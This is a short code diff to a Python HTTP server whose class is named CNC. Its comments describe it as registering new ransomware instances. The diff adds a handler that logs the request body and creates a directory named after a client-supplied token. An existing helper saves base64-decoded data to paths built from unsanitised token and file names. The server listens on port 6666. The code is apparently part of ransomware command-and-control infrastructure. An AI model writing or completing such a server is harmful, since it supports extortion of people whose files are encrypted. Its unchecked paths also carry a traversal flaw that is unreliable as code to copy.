@@ -10,17 +10,20 @@ class CNC(CNCBase):
 
     def save_b64(self, token:str, data:str, filename:str):
         # helper
-        # token and data are base64 field
+        # token and data are base64 fields
 
         bin_data = base64.b64decode(data)
         path = os.path.join(CNC.ROOT_PATH, token, filename)
         with open(path, "wb") as f:
             f.write(bin_data)
 
-    def post_new(self, path:str, params:dict, body:dict)->dict:
+    def post_new(self, path:str, params:dict, body:dict) -> dict:
         # used to register new ransomware instance
+        self._log.info(body)
+        token = params['token']
+        os.mkdir(path + '/' + str(token))
+
         return {"status":"KO"}
 
-           
 httpd = HTTPServer(('0.0.0.0', 6666), CNC)
 httpd.serve_forever()
